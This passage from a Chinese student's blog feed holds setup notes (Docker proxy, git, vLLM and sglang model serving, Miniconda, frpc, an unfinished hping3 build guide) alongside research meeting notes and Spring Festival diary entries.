class="string">&quot;HTTP_PROXY=http://127.0.0.1:1180&quot;</span></span><br><span class="line">Environment=<span class="string">&quot;HTTPS_PROXY=http://127.0.0.1:1180&quot;</span></span><br><span class="line"><span class="comment"># 如果使用了国内镜像源可以配置镜像服务器不使用代理</span></span><br><span class="line">Environmeng=<span class="string">&quot;NO_PROXY=&lt;registry.domain&gt;&quot;</span></span><br><span class="line">ExecStart=...</span><br><span class="line">...</span><br></pre></td></tr></table></figure><blockquote><p><strong>注意</strong>：尖括号<code>&lt;&gt;</code>中的内容需要替换为自己的代理服务器信息</p></blockquote><p>随后刷新配置：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl daemon-reload</span><br></pre></td></tr></table></figure><p>此时可以通过以下指令检查配置是否加载成功：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl show --property Environment docker</span><br><span class="line"><span class="comment"># 输出</span></span><br><span class="line">Environment=HTTP_PROXY=http://&lt;user&gt;:&lt;password&gt;@&lt;domain&gt;:&lt;port&gt; HTTPS_PROXY=http://&lt;user&gt;:&lt;password&gt;@&lt;domain&gt;:&lt;port&gt; NO_PROXY=&lt;registry.domain&gt;</span><br></pre></td></tr></table></figure><p>重启Docker服务使配置生效</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl restart docker</span><br></pre></td></tr></table></figure><p>重启成功之后通过<code>docker info</code>指令查看docker服务中的代理配置</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker info | grep Proxy</span><br><span class="line"><span class="comment"># 输出</span></span><br><span class="line"> HTTP Proxy: http://&lt;user&gt;:&lt;password&gt;@&lt;domain&gt;:&lt;port&gt;</span><br><span class="line"> HTTPS Proxy: http://&lt;user&gt;:&lt;password&gt;@&lt;domain&gt;:&lt;port&gt;</span><br><span class="line"> No Proxy: &lt;registry.domain&gt;</span><br></pre></td></tr></table></figure><p>此时再使用<code>docker pull</code>指令拉取镜像时Docker服务会使用代理服务器拉取镜像。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>git初始化仓库</title>
      <link href="/git%E5%88%9D%E5%A7%8B%E5%8C%96%E4%BB%93%E5%BA%93.htm"/>
      <url>/git%E5%88%9D%E5%A7%8B%E5%8C%96%E4%BB%93%E5%BA%93.htm</url>
      
        <content type="html"><![CDATA[<h2 id="新建一个仓库"><a href="#新建一个仓库" class="headerlink" title="新建一个仓库"></a>新建一个仓库</h2><h2 id="本地文件夹初始化"><a href="#本地文件夹初始化" class="headerlink" title="本地文件夹初始化"></a>本地文件夹初始化</h2><figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line">git <span class="keyword">init</span></span><br></pre></td></tr></table></figure><h2 id="添加远程仓库地址"><a href="#添加远程仓库地址" class="headerlink" title="添加远程仓库地址"></a>添加远程仓库地址</h2><figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">git remote <span class="keyword">add</span> origin git<span class="title">@github.com</span>:Anthonyfhd/Agsystem_FrontEnd.git</span><br></pre></td></tr></table></figure><h2 id="添加文件到本地仓库"><a href="#添加文件到本地仓库" class="headerlink" title="添加文件到本地仓库"></a>添加文件到本地仓库</h2><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">add</span> .</span><br></pre></td></tr></table></figure><h2 id="提交文件"><a href="#提交文件" class="headerlink" title="提交文件"></a>提交文件</h2><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">git</span> commit -m <span class="string">&quot;first commit&quot;</span></span><br></pre></td></tr></table></figure><h2 id="推送"><a href="#推送" class="headerlink" title="推送"></a>推送</h2><figure class="highlight maxima"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">push</span> -u <span class="built_in">origin</span> master</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>师大Aistation的VLLM配置</title>
      <link href="/%E5%B8%88%E5%A4%A7Aistation%E7%9A%84VLLM%E9%85%8D%E7%BD%AE.htm"/>
      <url>/%E5%B8%88%E5%A4%A7Aistation%E7%9A%84VLLM%E9%85%8D%E7%BD%AE.htm</url>
      
        <content type="html"><![CDATA[<h2 id="vllm"><a href="#vllm" class="headerlink" title="vllm"></a>vllm</h2><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">pip</span> install vllm</span><br><span class="line"><span class="comment">## Qwen2.5-7B</span></span><br><span class="line"><span class="attribute">vllm</span> serve qwen/Qwen2.<span class="number">5</span>-<span class="number">7</span>B  --api-key token-abc123 --host <span class="number">127.0.0.1</span> --port  <span class="number">8999</span> --gpu-memory-utilization <span class="number">0</span>.<span class="number">3</span> --max-model-len <span class="number">5000</span> --max_num_seqs <span class="number">2</span></span><br><span class="line"><span class="comment">## Qwen2.5-72B-AWQ</span></span><br><span class="line"><span class="attribute">vllm</span> serve /zengdaojian/wuhaodong/MODELS/Qwen2.<span class="number">5</span>-<span class="number">72</span>B-Instruct-AWQ/ --served-model-name Qwen2.<span class="number">5</span>-<span class="number">72</span>B-Instruct-AWQ --quantization awq --api-key token-abc123   --host <span class="number">0.0.0.0</span>     --port  <span class="number">8999</span> --tensor-parallel-size <span class="number">2</span></span><br><span class="line"><span class="attribute">vllm</span> serve /zengdaojian/wuhaodong/MODELS/Qwen2.<span class="number">5</span>-<span class="number">72</span>B-Instruct-AWQ/ --served-model-name Qwen2.<span class="number">5</span>-<span class="number">72</span>B-Instruct-AWQ --quantization awq --api-key token-abc123   --host <span class="number">0.0.0.0</span>     --port  <span class="number">8999</span> --gpu-memory-utilization <span class="number">0</span>.<span class="number">8</span></span><br><span class="line"><span class="comment">## Qwen2-VL</span></span><br><span class="line"><span class="attribute">vllm</span> serve /zengdaojian/wuhaodong/MODELS/Qwen2-VL-<span class="number">72</span>B-Instruct-AWQ/ --served-model-name Qwen2-VL-<span class="number">72</span>B-Instruct-AWQ --quantization awq --api-key token-abc123   --host <span class="number">0.0.0.0</span>     --port  <span class="number">8999</span></span><br><span class="line"><span class="comment">## Qwen2.5-Coder-32B多卡</span></span><br><span class="line"><span class="attribute">vllm</span> serve /zengdaojian/wuhaodong/MODELS/Qwen2.<span class="number">5</span>-Coder-<span class="number">32</span>B-Instruct/ --served-model-name Qwen2.<span class="number">5</span>-Coder-<span class="number">32</span>B-Instruct --api-key token-abc123   --host <span class="number">0.0.0.0</span>     --port  <span class="number">8999</span> --tensor-parallel-size <span class="number">2</span></span><br></pre></td></tr></table></figure><h2 id="sglang"><a href="#sglang" class="headerlink" title="sglang"></a>sglang</h2><figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line"><span class="comment">## Qwen2.5-Coder-32B</span></span><br><span class="line">python -m sglang.launch_server <span class="params">--model-path</span> <span class="string">/zengdaojian/wuhaodong/MODELS/Qwen2.5-Coder-32B-Instruct/</span> <span class="params">--served-model-name</span> Qwen2.5-Coder-32B-Instruct <span class="params">--api-key</span> token-abc123   <span class="params">--host</span> 0.0.0.0     <span class="params">--port</span>  8999 <span class="params">--tp-size</span> 4</span><br><span class="line"><span class="comment">## Qwen2.5-72B-AWQ</span></span><br><span class="line">python -m sglang.launch_server <span class="params">--model-path</span> <span class="string">/zengdaojian/wuhaodong/MODELS/Qwen2.5-72B-Instruct-AWQ/</span> <span class="params">--served-model-name</span> Qwen2.5-72B-Instruct-AWQ <span class="params">--api-key</span> token-abc123   <span class="params">--host</span> 0.0.0.0     <span class="params">--port</span>  8999 <span class="params">--tp-size</span> 4</span><br><span class="line"><span class="comment">## Qwen2.5-72B 非量化</span></span><br><span class="line">python -m sglang.launch_server <span class="params">--model-path</span> <span class="string">/zengdaojian/wuhaodong/MODELS/Qwen2.5-72B-Instruct/</span> <span class="params">--served-model-name</span> Qwen2.5-72B-Instruct <span class="params">--api-key</span> token-abc123 <span class="params">--host</span> 0.0.0.0 <span class="params">--port</span>  8999 <span class="params">--tp-size</span> 4</span><br><span class="line"><span class="comment">## Qwen-QwQ-32B</span></span><br><span class="line">python -m sglang.launch_server <span class="params">--model-path</span> <span class="string">/zengdaojian/wuhaodong/MODELS/QwQ-32B-Preview/</span> <span class="params">--served-model-name</span> QwQ-32B-Preview <span class="params">--api-key</span> token-abc123 <span class="params">--host</span> 0.0.0.0 <span class="params">--port</span>  8999 <span class="params">--tp-size</span> 4</span><br></pre></td></tr></table></figure><h2 id="LMDEPLOY"><a href="#LMDEPLOY" class="headerlink" title="LMDEPLOY"></a>LMDEPLOY</h2><figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line">pip install timm</span><br><span class="line">pip install flash-attn</span><br><span class="line"><span class="comment"># InternVL2_5-78B</span></span><br><span class="line">lmdeploy serve api_server <span class="string">/zengdaojian/wuhaodong/MODELS/InternVL2_5-78B/</span> <span class="params">--server-port</span> 8080 <span class="params">--server-name</span> 0.0.0.0 <span class="params">--model-name</span> internvl-2.5 <span class="params">--backend</span> turbomind <span class="params">--tp</span> 4</span><br><span class="line"></span><br><span class="line"><span class="comment"># Qwen2-VL-72B</span></span><br><span class="line">lmdeploy serve api_server <span class="string">/zengdaojian/wuhaodong/MODELS/Qwen2-VL-72B-Instruct</span> <span class="params">--server-port</span> 8999 <span class="params">--server-name</span> 0.0.0.0 <span class="params">--api-keys</span> token-abc123 <span class="params">--model-name</span> internvl-2.5 <span class="params">--backend</span> pytorch <span class="params">--tp</span> 4</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>20241202组会</title>
      <link href="/%E7%BB%84%E4%BC%9A/20241202%E7%BB%84%E4%BC%9A.htm"/>
      <url>/%E7%BB%84%E4%BC%9A/20241202%E7%BB%84%E4%BC%9A.htm</url>
      
        <content type="html"><![CDATA[<h2 id="rome和memit"><a href="#rome和memit" class="headerlink" title="rome和memit"></a>rome和memit</h2><h3 id="语言大模型知识冲突"><a href="#语言大模型知识冲突" class="headerlink" title="语言大模型知识冲突"></a>语言大模型知识冲突</h3><p><img src="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/blog/20241216130320559.png" alt="Pasted image 20241202191911"></p><h3 id="knock-out"><a href="#knock-out" class="headerlink" title="knock out"></a>knock out</h3><p><img src="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/blog/20241216130320560.png" alt="Pasted image 20241202192353"></p><h3 id="研究方向"><a href="#研究方向" class="headerlink" title="研究方向"></a>研究方向</h3><p>多智能体冲突<br>多模态大模型中编码文本+编码图像的冲突<br>外部检索和多模态知识的冲突</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Linux_X86_Miniconda</title>
      <link href="/Linux_X86_Miniconda.htm"/>
      <url>/Linux_X86_Miniconda.htm</url>
      
        <content type="html"><![CDATA[<h2 id="shell命令"><a href="#shell命令" class="headerlink" title="shell命令"></a>shell命令</h2><figure class="highlight plaintext"><figcaption><span>-O</span><a href="https://repo.anaconda.com/miniconda/Miniconda3-latest-Linux-x86_64.sh">link</a></figcaption><table><tr><td class="code"><pre><span class="line">bash ./Miniconda3-latest-Linux-x86_64.sh</span><br><span class="line">conda init</span><br><span class="line">proxy</span><br></pre></td></tr></table></figure><h2 id="bashrc内容"><a href="#bashrc内容" class="headerlink" title=".bashrc内容"></a>.bashrc内容</h2><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> <span class="attribute">HF_ENDPOINT</span>=https://hf-mirror.com</span><br><span class="line">proxy_on() &#123;</span><br><span class="line">  <span class="built_in">export</span> <span class="attribute">https_proxy</span>=http://172.27.48.26:1180 <span class="attribute">http_proxy</span>=http://172.27.48.26:1180 <span class="attribute">all_proxy</span>=http://172.27.48.26:1180</span><br><span class="line">  echo <span class="string">&quot;proxy on&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">proxy_off() &#123;</span><br><span class="line">  unset https_proxy http_proxy all_proxy</span><br><span class="line">  echo <span class="string">&quot;proxy off&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">proxy_off</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>frpc开启自启服务</title>
      <link href="/frpc%E5%BC%80%E5%90%AF%E8%87%AA%E5%90%AF%E6%9C%8D%E5%8A%A1.htm"/>
      <url>/frpc%E5%BC%80%E5%90%AF%E8%87%AA%E5%90%AF%E6%9C%8D%E5%8A%A1.htm</url>
      
        <content type="html"><![CDATA[<h3 id="vi-etc-systemd-system-frpc-service"><a href="#vi-etc-systemd-system-frpc-service" class="headerlink" title="vi /etc/systemd/system/frpc.service"></a>vi /etc/systemd/system/frpc.service</h3><figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="section">[Unit]</span></span><br><span class="line"><span class="attr">Description</span>=Frpc Service</span><br><span class="line"><span class="attr">After</span>=network.target</span><br><span class="line"></span><br><span class="line"><span class="section">[Service]</span></span><br><span class="line"><span class="attr">Type</span>=simple</span><br><span class="line"><span class="attr">Restart</span>=<span class="literal">on</span>-failure</span><br><span class="line"><span class="attr">RestartSec</span>=<span class="number">60</span>s</span><br><span class="line"><span class="attr">ExecStart</span>=/zengdaojian/wuhaodong/client/frpc -c /zengdaojian/wuhaodong/client/frpc.toml</span><br><span class="line"></span><br><span class="line"><span class="section">[Install]</span></span><br><span class="line"><span class="attr">WantedBy</span>=multi-user.target</span><br></pre></td></tr></table></figure><h3 id="重新加载systemctl服务"><a href="#重新加载systemctl服务" class="headerlink" title="重新加载systemctl服务"></a>重新加载systemctl服务</h3><figure class="highlight nsis"><table><tr><td class="code"><pre><span class="line">apt-get install <span class="params">system</span>d <span class="params">system</span>ctl</span><br><span class="line"><span class="params">system</span>ctl daemon-reload</span><br><span class="line"><span class="params">system</span>ctl start frpc</span><br><span class="line"><span class="params">system</span>ctl enable frpc</span><br></pre></td></tr></table></figure><h3 id="openssh"><a href="#openssh" class="headerlink" title="openssh"></a>openssh</h3><figure class="highlight swift"><table><tr><td class="code"><pre><span class="line">apt<span class="operator">-</span><span class="keyword">get</span> install openssh<span class="operator">-</span>server <span class="operator">-</span>y</span><br><span class="line">vi <span class="regexp">/etc/</span>ssh<span class="operator">/</span>sshd_config</span><br><span class="line"><span class="regexp">/etc/</span><span class="keyword">init</span>.d<span class="operator">/</span>ssh start</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>VITS</title>
      <link href="/VITS.htm"/>
      <url>/VITS.htm</url>
      
        <content type="html"><![CDATA[<h1 id="VITS"><a href="#VITS" class="headerlink" title="VITS"></a>VITS</h1><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><h3 id="GAN-生成式对抗网络"><a href="#GAN-生成式对抗网络" class="headerlink" title="GAN(生成式对抗网络)"></a>GAN(生成式对抗网络)</h3><p><img src="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/blog/2024/09/16/17264749442551.jpg" alt></p><h4 id="图例"><a href="#图例" class="headerlink" title="图例"></a>图例</h4><ul><li>D:判别器</li><li>G:生成器</li><li>z:简单分布</li><li>D和G分别交叉训练<ul><li>当训练D的时候，固定G，直到D能区分是真实的x还是虚假的G(z)</li><li>当训练G的时候，固定D，能够让G生成的fake数据欺骗判别器D<h4 id="生成器和判别器公式"><a href="#生成器和判别器公式" class="headerlink" title="生成器和判别器公式"></a>生成器和判别器公式</h4><img src="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/blog/2024/09/16/17264751004966.jpg" alt><h3 id="VAE-Variational-Auto-encoder-变分自编码器"><a href="#VAE-Variational-Auto-encoder-变分自编码器" class="headerlink" title="VAE(Variational Auto-encoder) 变分自编码器"></a>VAE(Variational Auto-encoder) 变分自编码器</h3></li></ul></li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>我回来了</title>
      <link href="/%E6%88%91%E5%9B%9E%E6%9D%A5%E4%BA%86.htm"/>
      <url>/%E6%88%91%E5%9B%9E%E6%9D%A5%E4%BA%86.htm</url>
      
        <content type="html"><![CDATA[<h1 id="许久不见，甚是想念"><a href="#许久不见，甚是想念" class="headerlink" title="许久不见，甚是想念"></a>许久不见，甚是想念</h1><h2 id="博客已经好久没有更新了，域名昨日刚刚重新备案和申请了ssl"><a href="#博客已经好久没有更新了，域名昨日刚刚重新备案和申请了ssl" class="headerlink" title="博客已经好久没有更新了，域名昨日刚刚重新备案和申请了ssl"></a>博客已经好久没有更新了，域名昨日刚刚重新备案和申请了ssl</h2><p>由于近期比较忙碌，退役后也陆陆续续回归正轨了，进入人生的下一阶段，感慨万千。</p><h3 id="今年剩下的阶段："><a href="#今年剩下的阶段：" class="headerlink" title="今年剩下的阶段："></a>今年剩下的阶段：</h3><ul><li><del>毕业论文/设计+答辩</del></li><li>毕业典礼</li><li>算法岗实习</li><li>研究生入学</li></ul><p>愿大家顺顺利利，未来可期！<br><br>给大家看一只贱狗：<br><img src="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/town/202404261048913.JPG" alt></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>大年初四</title>
      <link href="/%E5%A4%A7%E5%B9%B4%E5%88%9D%E5%9B%9B.htm"/>
      <url>/%E5%A4%A7%E5%B9%B4%E5%88%9D%E5%9B%9B.htm</url>
      
        <content type="html"><![CDATA[<h1 id="大年初四"><a href="#大年初四" class="headerlink" title="大年初四"></a>大年初四</h1><h2 id="假期余额不足，已经过了5天了呜呜呜"><a href="#假期余额不足，已经过了5天了呜呜呜" class="headerlink" title="假期余额不足，已经过了5天了呜呜呜"></a>假期余额不足，已经过了5天了呜呜呜</h2><h5 id="今天早上真人cs赢了一瓶洗衣液和奶针不错，就是有点费嘴。"><a href="#今天早上真人cs赢了一瓶洗衣液和奶针不错，就是有点费嘴。" class="headerlink" title="今天早上真人cs赢了一瓶洗衣液和奶针不错，就是有点费嘴。"></a>今天早上真人cs赢了一瓶洗衣液和奶针不错，就是有点费嘴。</h5><h4 id="今天无聊刷了三部韩剧剧评，又把我恋爱脑激发了。"><a href="#今天无聊刷了三部韩剧剧评，又把我恋爱脑激发了。" class="headerlink" title="今天无聊刷了三部韩剧剧评，又把我恋爱脑激发了。"></a>今天无聊刷了三部韩剧剧评，又把我恋爱脑激发了。</h4><iframe src="//player.bilibili.com/player.html?aid=644920671&bvid=BV1GY4y1u7S1&cid=815206879&page=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true"> </iframe><iframe src="//player.bilibili.com/player.html?aid=480502721&bvid=BV1ZT411m7eY&cid=970872175&page=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true"> </iframe><iframe src="//player.bilibili.com/player.html?aid=308235093&bvid=BV1pA411d7MK&cid=974163244&page=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true"> </iframe>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>大年初三</title>
      <link href="/%E5%A4%A7%E5%B9%B4%E5%88%9D%E4%B8%89.htm"/>
      <url>/%E5%A4%A7%E5%B9%B4%E5%88%9D%E4%B8%89.htm</url>
      
        <content type="html"><![CDATA[<h1 id="大年初三"><a href="#大年初三" class="headerlink" title="大年初三"></a>大年初三</h1><h2 id="今天的活动没什么我喜欢的，打兵乒球的，桌球的，还有晚上王者荣耀比赛的，除了下午起床去看电影之外。"><a href="#今天的活动没什么我喜欢的，打兵乒球的，桌球的，还有晚上王者荣耀比赛的，除了下午起床去看电影之外。" class="headerlink" title="今天的活动没什么我喜欢的，打兵乒球的，桌球的，还有晚上王者荣耀比赛的，除了下午起床去看电影之外。"></a>今天的活动没什么我喜欢的，打兵乒球的，桌球的，还有晚上王者荣耀比赛的，除了下午起床去看电影之外。</h2><p>今天早上收垃圾换人啦，顺势把一些后端服务修复了，下午4点起床去看《满江红》，看了两个小时，带回汇餐了，还有30多分钟没看，因为吃太多香蕉了，回来马上去厕所喷射了，回来都在吃了（图是别人拍的为什么没对上焦的原因），虾仁猪心。</p><p><img src="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/blog/202301241946017.png" alt="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/blog/202301241946017.png"></p><p><img src="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/blog/202301241910399.jpg" alt="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/blog/202301241910399.jpg"><br><img src="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/blog/202301241910400.jpg" alt="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/blog/202301241910400.jpg"><br><img src="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/blog/202301241910401.jpg" alt="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/blog/202301241910401.jpg"><br><img src="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/blog/202301241910402.jpg" alt="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/blog/202301241910402.jpg"><br><img src="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/blog/202301241910404.jpg" alt="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/blog/202301241910404.jpg"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>大年初二</title>
      <link href="/%E5%A4%A7%E5%B9%B4%E5%88%9D%E4%BA%8C.htm"/>
      <url>/%E5%A4%A7%E5%B9%B4%E5%88%9D%E4%BA%8C.htm</url>
      
        <content type="html"><![CDATA[<h1 id="大年初二碎碎念"><a href="#大年初二碎碎念" class="headerlink" title="大年初二碎碎念"></a>大年初二碎碎念</h1><h2 id="早上的篮球技巧赛，下午的桌球赛，与我无瓜，我还要被派去收垃圾🌿"><a href="#早上的篮球技巧赛，下午的桌球赛，与我无瓜，我还要被派去收垃圾🌿" class="headerlink" title="早上的篮球技巧赛，下午的桌球赛，与我无瓜，我还要被派去收垃圾🌿"></a>早上的篮球技巧赛，下午的桌球赛，与我无瓜，我还要被派去收垃圾🌿</h2><p>今天想必是回娘家的回娘家，去外婆家的去外婆家拜年啦，祝大家收多点5块钱人民币的大红包🧧。</p><p>🌿，今天早上要去收垃圾，真尼玛又脏又臭！</p><p><img src="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/blog/202301241923803.jpg" alt="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/blog/202301241923803.jpg"><br><img src="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/blog/202301241923805.jpg" alt="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/blog/202301241923805.jpg！"></p>]]></content>
      
      
      <categories>
          
          <category> 生活日常 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 生活日常 </tag>
            
            <tag> 碎碎文 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>大年初一</title>
      <link href="/%E5%A4%A7%E5%B9%B4%E5%88%9D%E4%B8%80.htm"/>
      <url>/%E5%A4%A7%E5%B9%B4%E5%88%9D%E4%B8%80.htm</url>
      
        <content type="html"><![CDATA[<h1 id="大年初一"><a href="#大年初一" class="headerlink" title="大年初一"></a>大年初一</h1><h2 id="祝各位新年快乐哈，兔年大吉，升官发财但比不过家里人身体健康重要！"><a href="#祝各位新年快乐哈，兔年大吉，升官发财但比不过家里人身体健康重要！" class="headerlink" title="祝各位新年快乐哈，兔年大吉，升官发财但比不过家里人身体健康重要！"></a>祝各位新年快乐哈，兔年大吉，升官发财但比不过家里人身体健康重要！</h2><p><strong><em>今日活动</em></strong></p><table><thead><tr><th>时间</th><th>活动</th></tr></thead><tbody><tr><td>早上</td><td>游园</td></tr><tr><td>下午</td><td>钩机牌</td></tr><tr><td>晚上</td><td>流浪地球</td></tr></tbody></table><p>​    好久没发过博客了，有空刷刷存在感才行🐰🐰🐰。</p><p>​    在这里的日子过得节特别有年味，毕竟无论到节日布置(灯笼，彩旗，兔子灯饰)、板报设计、手写几十副对联、刷漆等等等都是自己搞的，这也是我在这过的最后一个年啦，虽然活动是强制要求的，每天都有俩活动，但是玩的是其乐融融，重要的是里面的人关系比较单纯，都是出生入死的兄弟。比起在家里的冷冷清清，除了打麻将就是玩电脑抠手机，烟花可能找不到地方买了，除非在乡下。</p><h4 id="不得不说《流浪地球2》差评，就特效能看，剧情一言难尽，期待后天的满江红"><a href="#不得不说《流浪地球2》差评，就特效能看，剧情一言难尽，期待后天的满江红" class="headerlink" title="不得不说《流浪地球2》差评，就特效能看，剧情一言难尽，期待后天的满江红"></a>不得不说《流浪地球2》差评，就特效能看，剧情一言难尽，期待后天的满江红</h4><p><img src="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/blog/20230122172002.png" alt="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/blog/20230122172002.png"></p><iframe src="//player.bilibili.com/player.html?aid=393018479&bvid=BV1ad4y1V7wb&cid=971466390&page=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true"> </iframe>]]></content>
      
      
      <categories>
          
          <category> 生活日常 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 生活日常 </tag>
            
            <tag> 碎碎文 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hping3编译安装和使用方法</title>
      <link href="/hping3%E7%BC%96%E8%AF%91%E5%AE%89%E8%A3%85%E5%92%8C%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95.htm"/>
      <url>/hping3%E7%BC%96%E8%AF%91%E5%AE%89%E8%A3%85%E5%92%8C%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95.htm</url>
      
        <content type="html"><![CDATA[<h1 id="Hping3编译安装和使用方法"><a href="#Hping3编译安装和使用方法" class="headerlink" title="Hping3编译安装和使用方法"></a>Hping3编译安装和使用方法</h1><h3 id="基于centos7系统安装过程"><a href="#基于centos7系统安装过程" class="headerlink" title="基于centos7系统安装过程"></a>基于centos7系统安装过程</h3><h4 id="1-安装好组件"><a href="#1-安装好组件" class="headerlink" title="1.安装好组件"></a>1.安装好组件</h4><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">yum -y install tcl tcl-devel libpcap libpcap-devel</span><br><span class="line">ln -s <span class="regexp">/usr/i</span>nclude<span class="regexp">/pcap-bpf.h /u</span>sr<span class="regexp">/include/</span>net/bpf.h</span><br><span class="line">wget http:<span class="regexp">//</span>www.hping.org/hping3-<span class="number">20051105</span>.tar.gz</span><br><span class="line">tar -zxvf hping3-<span class="number">20051105</span>.tar.gz</span><br><span class="line">cd hping3-<span class="number">20051105</span></span><br></pre></td></tr></table></figure><h4 id="2-修改bytesex-h文件-加多一行x86-64支持"><a href="#2-修改bytesex-h文件-加多一行x86-64支持" class="headerlink" title="2.修改bytesex.h文件(加多一行x86_64支持)"></a>2.修改bytesex.h文件(加多一行x86_64支持)</h4><p>不然会报错</p><p><img src="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/blog/20190401103738521.png" alt="img"></p><figure class="highlight cmake"><table><tr><td class="code"><pre><span class="line"><span class="comment">#if     defined(__i386__) \</span></span><br><span class="line">        || <span class="keyword">defined</span>(__x86_64__) \</span><br><span class="line">        || <span class="keyword">defined</span>(__alpha__) \</span><br><span class="line">        || (<span class="keyword">defined</span>(__mips__) &amp;&amp; (<span class="keyword">defined</span>(MIPSEL) || <span class="keyword">defined</span> (__MIPSEL__)))</span><br></pre></td></tr></table></figure><h4 id="3-创建好目录"><a href="#3-创建好目录" class="headerlink" title="3.创建好目录"></a>3.创建好目录</h4><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">mkdir <span class="regexp">/usr/</span>local/man</span><br><span class="line">mkdir <span class="regexp">/usr/</span>local<span class="regexp">/man/m</span>an8</span><br></pre></td></tr></table></figure><h4 id="4-编译和安装"><a href="#4-编译和安装" class="headerlink" title="4.编译和安装"></a>4.编译和安装</h4><figure class="highlight gauss"><table><tr><td class="code"><pre><span class="line">./configure</span><br><span class="line"><span class="built_in">make</span></span><br><span class="line"><span class="built_in">make</span> install</span><br></pre></td></tr></table></figure><h3 id="可能出现的其他问题"><a href="#可能出现的其他问题" class="headerlink" title="可能出现的其他问题"></a>可能出现的其他问题</h3><h4 id="1-main-c-29-18-fatal-error-pcap-h-No-such-file-or-directoryX"><a href="#1-main-c-29-18-fatal-error-pcap-h-No-such-file-or-directoryX" class="headerlink" title="1.main.c:29:18: fatal error: pcap.h: No such file or directoryX"></a>1.main.c:29:18: fatal error: pcap.h: No such file or directoryX</h4><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="regexp">//</span>我们缺少pcap库，安装</span><br><span class="line">yum install -y libpcap libpcap-devel</span><br></pre></td></tr></table></figure><h4 id="2-libpcap-stuff-c-20-21-fatal-error-net-bpf-h-No-such-file-or-directory"><a href="#2-libpcap-stuff-c-20-21-fatal-error-net-bpf-h-No-such-file-or-directory" class="headerlink" title="2.libpcap_stuff.c:20:21: fatal error: net/bpf.h: No such file or directory"></a>2.libpcap_stuff.c:20:21: fatal error: net/bpf.h: No such file or directory</h4><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="regexp">//</span>创建一个软链接</span><br><span class="line">ln -sf <span class="regexp">/usr/i</span>nclude<span class="regexp">/pcap-bpf.h /u</span>sr<span class="regexp">/include/</span>net/bpf.h</span><br></pre></td></tr></table></figure><h4 id="3-cannot-find-ltcl"><a href="#3-cannot-find-ltcl" class="headerlink" title="3.cannot find -ltcl"></a>3.cannot find -ltcl</h4><figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">//我们需要安装<span class="keyword">tcl</span>库</span><br><span class="line">yum -<span class="keyword">y</span> install <span class="keyword">tcl</span> <span class="keyword">tcl</span>-devel</span><br></pre></td></tr></table></figure><h4 id="4-Can’t-install-the-man-page-usr-local-confd-man-man8-does-not-exist"><a 